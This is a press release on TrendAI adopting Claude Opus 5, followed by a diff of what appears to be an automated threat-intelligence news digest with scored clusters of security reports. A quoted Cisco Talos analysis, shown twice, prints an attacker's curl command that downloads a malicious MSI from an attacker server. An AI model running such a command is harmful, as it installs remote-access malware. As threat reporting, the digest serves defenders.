 arrow_back search close Newsroom Media Coverage Global Press Releases Local Press Releases Stay connected with press releases from Trend teams in your region. Media Contacts Investor Relations TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching As a participant in Anthropic's Cyber Verification Program, TrendAI applies frontier reasoning to convert vulnerability intelligence into faster protection across hybrid environments DALLAS , July 24, 2026 / PRNewswire / -- TrendAI™, the enterprise AI security leader from Trend Micro Incorporated (TYO: 4704; TSE: 4704), today announced it is adopting Claude Opus 5, Anthropic's latest and most capable Opus model, to help security teams convert vulnerability intelligence into immediate protection, from prioritization to virtual patching. The move builds on TrendAI's collaboration with Anthropic on Claude Opus 4.8, extending the same defensive focus to a model that delivers step-change gains in advanced reasoning, agentic workflows, and long-horizon analysis. As AI makes finding vulnerabilities easier than ever, the harder problem becomes protecting organizations faster than software can be permanently patched, and that is where TrendAI is putting Opus 5 to work. As a participant in Anthropic's Cyber Verification Program, which credentials organizations for the defensive use of frontier AI models, TrendAI is positioned to apply Claude Opus 5 to defensive security as access becomes available. The model is Zero Data Retention compatible, supporting TrendAI's governance and data-protection requirements as it scales AI across security operations. The work extends to TrendAI Threat Research, where frontier AI models are combined with our proprietary frontier intelligence engine and human expertise to generate pre-disclosure intelligence. Those insights power TrendAI Vision One™, delivering stronger detection, deeper forensic insights, and proactive protection through virtual patching. Rachel Jin, Chief Platform and Business Officer, Head of TrendAI™: "With Claude Opus 5, TrendAI can move from vulnerability intelligence to action faster than ever, prioritizing what matters most by exploitability and business impact. Finding the vulnerability was always the hard part. Now the challenge is protecting organizations faster than software can be permanently patched, and frontier reasoning is what changes that equation, extending all the way to virtual patching that protects customers before a vendor fix ships. This is what it means to secure the AI age, fearlessly." These capabilities support TrendAI Vision One™ in helping security analysts, AppSec teams, and SOC teams prioritize exposure, map attack paths, and accelerate mitigation, including virtual patching, across hybrid environments, moving vulnerability management from a static scanning process into a faster, context-aware risk mitigation workflow. About TrendAI™ TrendAI™, the global AI security leader and enterprise business unit of Trend Micro, empowers organizations with full AI visibility and consolidated security that inspires confidence, drives innovation, and eliminates risk. Trusted by the largest enterprises and governments across 185 countries, TrendAI™ secures the entire organization, from identities, to infrastructure, to data. Global Fortune 500 companies rely on TrendAI™ to cut risk and stop threats up to three months earlier, powered by world-leading threat and attack intelligence. Through deep ecosystem partnerships with market leaders like NVIDIA, Anthropic, AWS, Google, and Microsoft, TrendAI™ empowers your organization to securely drive forward at the speed of AI. AI Fearlessly. Learn more: trendaisecurity.com About Anthropic Anthropic is an AI safety and research company dedicated to building reliable, interpretable, and steerable AI systems. Its Claude family of models, including Claude Opus 5, enables advanced capabilities across a wide range of applications, including code understandi
 ```
 
-#### Corroborating sources (7)
+#### Corroborating sources (6)
 
 - **Trend Micro Research** (threat_research_primary)
   - Title: TrendAI™ Adopts Claude Opus 5 to Advance Vulnerability Prioritization and Virtual Patching
@@ -1089,11 +1066,6 @@ arrow_back search close Newsroom Media Coverage Global Press Releases Local Pres
   - Published: 2026-07-22T19:30:00+00:00
   - Link: https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
   - Summary: The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them.
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: Escaping Claude Cowork’s local VM sandbox via CVE-2026-46331
-  - Published: 2026-07-24T05:53:48+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
-  - Summary: submitted by /u/natcoba [link] [comments]
 - **SecurityWeek** (cyber_news_breach_reporting)
   - Title: Anthropic’s Opus 5 Nears Mythos 5 on Finding Bugs, but Falls Short on Exploits
   - Published: 2026-07-27T10:02:41+00:00
@@ -1582,15 +1554,15 @@ Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Acce
 - Published: 2026-07-27T12:04:09+00:00
 - Link: https://www.helpnetsecurity.com/2026/07/27/certighost-cve-2026-54121-poc-exploit-released/
 - Fetch status: ok
-- Member count: 2
+- Member count: 3
 - Corroborating source count: 2
 - Strong signals: CVE-2026-54121, Microsoft Windows
 
 #### Cluster taxonomy (union across members)
 - affected_products: Microsoft Windows
-- cve_ids: CVE-2026-50458, CVE-2026-54121
+- cve_ids: CVE-2026-54121
 - urgency_signals: poc_available
-- content_type: vulnerability_disclosure
+- content_type: news_report, vulnerability_disclosure
 - confidence_tier: tier_4_news, tier_5_chatter
 
 #### Primary article taxonomy
@@ -1619,11 +1591,11 @@ Zeljka Zorz , Editor-in-Chief, Help Net Security July 27, 2026 Share PoC exploit
   - Published: 2026-07-27T12:04:09+00:00
   - Link: https://www.helpnetsecurity.com/2026/07/27/certighost-cve-2026-54121-poc-exploit-released/
   - Summary: Security researchers who discovered and reported CVE-2026-54121 (aka “Certighost”), a critical privilege elevation vulnerability in Active Directory Certificate Services (AD CS), have released a proof-of-concept (PoC) exploit for and technical details related to the flaw. The vulnerability AD CS is a Microsoft Windows Server role that lets an organization run its own Public Key Infrastructure (PKI). It acts as a Certificate Authority (CA), issuing and managing digital certificates used for authentication, encryption, and signing across … More → The post PoC exploit released for critical AD CS domain-takeover flaw (CVE-2026-54121) appeared first on Help Net Security .
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: CVE-2026-50458: Finding a UAF in the Windows Brokering File System
-  - Published: 2026-07-22T19:08:40+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1v3ptel/cve202650458_finding_a_uaf_in_the_windows/
-  - Summary: Deep dive into a UAF in the bfs.sys Windows kernel minifilter driver patched in this month's Patch Tuesday. submitted by /u/Internal-Key64 [link] [comments]
+- **Reddit r/cybersecurity** (reddit_practitioner_osint)
+  - Title: Detection Opportunities for Certighost (CVE-2026-54121)
+  - Published: 2026-07-27T17:46:36+00:00
+  - Link: https://www.reddit.com/r/cybersecurity/comments/1v87k4z/detection_opportunities_for_certighost/
+  - Summary: submitted by /u/Cyb3r-Monk [link] [comments]
 
 ### Cluster e67ac609ab — score 13
 
@@ -1997,47 +1969,6 @@ Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & T
   - Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
   - Summary: A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.
 
-### Cluster fa1b41f3b5 — score 11
-
-- Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
-- Source: Risky Business News (practitioner_analysis)
-- Published: 2026-07-27T06:28:36+00:00
-- Link: https://risky.biz/RBNEWS592/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- content_type: news_report
-- confidence_tier: tier_3_analysis
-
-#### Summary
-
-```
-A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.
-```
-
-#### Full body
-
-```
-Risky Bulletin Podcast July 27, 2026 Risky Bulletin: A JSON RCE bug is about to rock the Java world Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme. Your browser does not support the audio element. Risky Bulletin: A JSON RCE bug is about to rock the Java world â¶ 0:00 / 6:59 Subscribe Brought to you by Airlock Digital Allowlisting Software - Allowlist Made Simple Show notes Risky Bulletin: A JSON RCE bug is about to rock the Java world
-```
-
-#### Corroborating sources (1)
-
-- **Risky Business News** (practitioner_analysis)
-  - Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
-  - Published: 2026-07-27T06:28:36+00:00
-  - Link: https://risky.biz/RBNEWS592/
-  - Summary: A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.
-
 ### Cluster c39a89392e — score 11
 
 - Title: Announcing the Cloud Security Alliance on AWS Compliance Guide
@@ -2260,49 +2191,6 @@ Date Published July 24, 2026 Topics Targeted Surveillance telecommunications Men
   - Link: https://citizenlab.ca/how-iran-uses-cellular-infrastructure-to-target-us-military-phones/
   - Summary: Senior fellow Gary Miller spoke with Cape Cellular about the exploitation of mobile network vulnerabilities to track US personnel during the Iran war. The post How Iran Uses Cellular Infrastructure to Target US Military Phones appeared first on The Citizen Lab .
 
-### Cluster a1940e8772 — score 10
-
-- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-07-23T10:00:38+00:00
-- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
-- affected_products: Cisco
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
-- affected_products: Cisco
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
-```
-
-#### Full body
-
-```
-Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
-```
-
-#### Corroborating sources (1)
-
-- **Cisco Talos** (threat_research_primary)
-  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
-  - Published: 2026-07-23T10:00:38+00:00
-  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
-  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
-
 ### Cluster b4009da441 — score 10
 
 - Title: Ransomware is the Scoreboard
@@ -2431,6 +2319,49 @@ Mapping Modern Attack Vectors: What Threat Actors Are Targeting in 2026 Key Take
   - Published: 2026-07-22T00:00:00+00:00
   - Link: https://www.recordedfuture.com/blog/modern-attack-vectors
   - Summary: What is an attack vector, and how does it impact your business? Discover the top threat actor targets in 2026 and learn attack vector vs attack surface dynamics.
+
+### Cluster a1940e8772 — score 10
+
+- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-07-23T10:00:38+00:00
+- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
+- affected_products: Cisco
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
+- affected_products: Cisco
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
+```
+
+#### Full body
+
+```
+Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll (msaRAT) msaRAT is written in Rust and implemented using the asynchronous runtime Tokio. Its primary capabilities include browser-leveraged reverse shell and covert tunneling to establish communications with a C2 server. The export table of “lib.dll” exposes a function named RUN , which is designed to be called by the installer described above. Based on the actual logs, after downloading this malware, we have confirmed the existence of a ransom note. Tokio runtime initialization Tokio is a runtime for exec
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
+  - Published: 2026-07-23T10:00:38+00:00
+  - Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
+  - Summary: The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
 
 ### Cluster 75f4c3d8b0 — score 10
 
@@ -2667,6 +2598,51 @@ Dental and vision benefits administrator DentaQuest is notifying millions of peo
   - Link: https://www.securityweek.com/dentaquest-data-breach-potentially-impacts-over-23-million-people/
   - Summary: In May 2026, hackers stole personal and dental health information from DentaQuest’s computer network. The post DentaQuest Data Breach Potentially Impacts Over 23 Million People appeared first on SecurityWeek .
 
+### Cluster 361cf175a3 — score 10
+
+- Title: Adversaries Don't Need a Zero-Day — They Read Your Rulebook
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-07-27T17:31:18+00:00
+- Link: https://www.darkreading.com/threat-intelligence/adversaries-do-not-need-zero-day-they-read-your-rulebook
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- affected_industries: government
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- affected_industries: government
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Confidence in autonomous security tools is declining, and here's why.
+```
+
+#### Full body
+
+```
+Threat Intelligence Vulnerabilities & Threats Cyber Risk Commentary Adversaries Don't Need a Zero-Day — They Read Your Rulebook Confidence in autonomous security tools is declining, and here's why. Burak Oktenli , Independent Security Researcher July 27, 2026 5 Min Read Source: filo via Getty Images OPINION Recently, Robert Lemos reported in Dark Reading that confidence in autonomous penetration testing is falling : The share of organizations willing to rely on it dropped to 9% in 2026, down from 29% a year earlier, according to a Cobalt report. Companies are still experimenting with AI systems that hunt for weaknesses, but far fewer are leaning on them the way they did a year ago. The obvious explanation is that the technology overpromised and is now settling into a trough. I think something more specific is going on, and it carries a lesson that applies to autonomous defense just as much as offense. When we field an autonomous security system, we wrap it in rules . We set authority ceilings so it cannot act beyond a certain level without a human. We add recovery protocols, so it steps back to a safe posture when something looks wrong, then steps forward again slowly once conditions clear. We log every decision, so the whole thing is auditable. Related: 1M+ Emails Use Hidden Text to Dupe AI Security Filters This is good engineering and good governance, and most of us are proud of it. The problem begins once those rules are written down, certified, and described in a standard or a product sheet. From that point on, the rules are not only your safeguards. They are public information, and a capable adversary can read them and act on what they read. Consider a defensive system with sound governance at the edge of your network. It evaluates the evidence correctly on every cycle, stays under its authority ceiling, and records everything for review. Over eight weeks, nothing in its logs looks wrong on any single day. Yet the system drifts steadily into a permanently supervised state where a human must approve nearly every action. No one breached it, and no exploit was fired. The adversary simply understood the recovery rule, which by design lets the system step back fast but recover slowly, and engineered a rhythm around it: short bursts of low-grade probing that knock the system down, followed by quiet periods during which it crawls back up. The probes cost the adversary almost nothing. The recovery is free, because it's just your system behaving exactly as specified. The result is a defense that has been talked out of its own authority without a single line of its code being touched. Cap Weaponization I call this cap weaponization: the exploitation of the governance layer itself as an attack surface, separate from the technical attack surface of the systems it governs. The underlying move is old, even if the setting is new. Anyone who has watched a metric get gamed knows Goodhart's law, where the moment a measure becomes a target, people optimize the measure and abandon the goal. The same dynamic drives lawfare in international conflict, where an adversary turns your own commitment to the rules into a weapon against you. AI safety researchers see it too, in specification gaming, where a model satisfies the letter of its objective while trampling the intent. Autonomous defense is the next place this same move appears, and the stakes there are about as high as they get. Related: Police Disrupt a €140M Cyber Fraud Ring in Spain The slow-drift example is only one opening. The same governance layer offers several. An adversary can feed false inputs, so the authority computation reads conditions that aren't real. Another path is to slip past the ceiling through configuration drift rather than a clean exploit. A third move is faking the signals that say a threat has passed, so the system recovers authority it has not actually earned. And in coalition setups, the weakest participant becomes the target, since one soft node can drag the sha
+```
+
+#### Corroborating sources (1)
+
+- **Dark Reading** (cyber_news_breach_reporting)
+  - Title: Adversaries Don't Need a Zero-Day — They Read Your Rulebook
+  - Published: 2026-07-27T17:31:18+00:00
+  - Link: https://www.darkreading.com/threat-intelligence/adversaries-do-not-need-zero-day-they-read-your-rulebook
+  - Summary: Confidence in autonomous security tools is declining, and here's why.
+
 ### Cluster e8dbc4eb0f — score 10
 
 - Title: JetStream Security enables on-demand shutdown of compromised AI agents
@@ -2708,12 +2684,12 @@ Industry News July 27, 2026 Share JetStream Security enables on-demand shutdown 
   - Link: https://www.helpnetsecurity.com/2026/07/27/jetstream-ai-kill-switch/
   - Summary: JetStream Security has announced the release of an AI Kill Switch that allows organizations to shut down compromised AI agents on-demand without impacting other AI operations. This new control plane for AI agents solves the inability to stop a single agent that falters, begins overspending, or needs to be taken offline for compliance reasons without affecting other agents. JetStream’s AI Kill Switch solves a problem many businesses have not faced up to this point: AI … More → The post JetStream Security enables on-demand shutdown of compromised AI agents appeared first on Help Net Security .
 
-### Cluster fa1ef247b7 — score 10
+### Cluster 482137e072 — score 10
 
 - Title: New vBulletin Vulnerability!
-- Source: Reddit r/netsec (reddit_practitioner_osint)
-- Published: 2026-07-27T14:00:29+00:00
-- Link: https://www.reddit.com/r/netsec/comments/1v8192k/new_vbulletin_vulnerability/
+- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
+- Published: 2026-07-27T14:00:19+00:00
+- Link: https://www.reddit.com/r/cybersecurity/comments/1v818wh/new_vbulletin_vulnerability/
 - Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
@@ -2739,94 +2715,52 @@ CVE-2026-61511 - a critical vulnerability in vBulletin that allows an unauthenti
 
 #### Corroborating sources (1)
 
-- **Reddit r/netsec** (reddit_practitioner_osint)
+- **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - Title: New vBulletin Vulnerability!
-  - Published: 2026-07-27T14:00:29+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1v8192k/new_vbulletin_vulnerability/
+  - Published: 2026-07-27T14:00:19+00:00
+  - Link: https://www.reddit.com/r/cybersecurity/comments/1v818wh/new_vbulletin_vulnerability/
   - Summary: CVE-2026-61511 - a critical vulnerability in vBulletin that allows an unauthenticated attacker to execute arbitrary code on a remote server. submitted by /u/SSDisclosure [link] [comments]
 
-### Cluster 1186a44566 — score 10
+### Cluster fa1b41f3b5 — score 10
 
-- Title: GitHub issues $100,000 bounty for critical RCE vulnerability
-- Source: Reddit r/netsec (reddit_practitioner_osint)
-- Published: 2026-07-22T22:21:24+00:00
-- Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
-- Fetch status: fetch_failed:HTTPError
-- Member count: 2
-- Corroborating source count: 2
-- Strong signals: GitHub
-
-#### Cluster taxonomy (union across members)
-- affected_products: GitHub, Packagist, cPanel
-- content_type: news_report, vulnerability_disclosure
-- confidence_tier: tier_4_news, tier_5_chatter
-
-#### Primary article taxonomy
-- affected_products: GitHub
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-submitted by /u/ryanmerket [link] [comments]
-```
-
-#### Corroborating sources (2)
-
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: GitHub issues $100,000 bounty for critical RCE vulnerability
-  - Published: 2026-07-22T22:21:24+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
-  - Summary: submitted by /u/ryanmerket [link] [comments]
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Attackers Weaponize GitHub Actions Runners to Target cPanel and WHM Servers
-  - Published: 2026-07-23T11:28:54+00:00
-  - Link: https://thehackernews.com/2026/07/attackers-weaponize-github-actions.html
-  - Summary: Cybersecurity researchers have shed light on a large-scale campaign that has turned compromised GitHub repositories into distributed attack infrastructure designed to target cPanel and WebHost Manager (WHM) instances. The activity involves malicious Packagist development versions spanning 10 packages associated with a legitimate PHP and DevOps developer, dinushchathurya, between July 12 and 13,
-
-### Cluster 574ebfebeb — score 9
-
-- Title: UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations
-- Source: NCSC UK (government_authoritative)
-- Published: 2026-07-23T12:00:00+00:00
-- Link: https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign
+- Title: Risky Bulletin: A JSON RCE bug is about to rock the Java world
+- Source: Risky Business News (practitioner_analysis)
+- Published: 2026-07-27T06:28:36+00:00
+- Link: https://risky.biz/RBNEWS592/
 - Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, phishing_social_eng
-- affected_industries: critical_infrastructure, education, government
+- threat_categories: apt_espionage
 - content_type: news_report
-- confidence_tier: tier_1_government
+- confidence_tier: tier_3_analysis
 
 #### Primary article taxonomy
-- threat_categories: phishing_social_eng, apt_espionage
-- affected_industries: government, critical_infrastructure, education
+- threat_categories: apt_espionage
 - content_type: news_report
-- confidence_tier: tier_1_government
+- confidence_tier: tier_3_analysis
 
 #### Summary
 
 ```
-GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign
+A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme.
 ```
 
 #### Full body
 
 ```
-News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi
+Risky Bulletin Podcast July 27, 2026 Risky Bulletin: A JSON RCE bug is about to rock the Java world Presented by Catalin Cimpanu News Editor Claire Aird Newsreader A JSON bug is about to rock the Java world, scam compounds continue in Myanmar despite the junta crackdown, and Google has a new APT naming scheme. Your browser does not support the audio element. Risky Bulletin: A JSON RCE bug is about to rock the Java world â¶ 0:00 / 6:59 Subscribe Brought to you by Airlock Digital Allowlisting Software - Allowlist Made Simple Show notes Risky Bulletin: A JSON RCE bug is about to rock the Java world
 ```
 
 #### Corroborating sources (1)
 
-- **NCSC UK** (government_authoritative)
